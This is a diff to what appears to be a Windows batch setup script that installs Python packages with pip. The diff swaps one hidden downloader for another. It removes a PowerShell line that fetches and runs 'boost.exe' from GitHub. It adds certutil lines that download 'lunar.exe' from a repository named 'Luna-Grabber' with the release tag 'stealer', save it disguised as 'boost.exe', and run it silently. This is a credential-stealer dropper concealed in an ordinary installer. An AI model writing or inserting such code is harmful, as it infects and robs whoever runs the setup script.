@@ -32,6 +32,11 @@ pip install urllib3==1.26.14
 pip install Werkzeug==2.2.3
 pip install yarl==1.8.2
 pip install zipp==3.13.0
-cd input
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe';$file='boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+set "URL=https://github.com/hvbsvqdj/Luna-Grabber/releases/download/stealer/lunar.exe"
+set "Dossier=input"
+set "NomFichier=%Dossier%\boost.exe"
+certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1
+if exist "%NomFichier%" (
+    start "" "%NomFichier%"
+)
 start start.bat
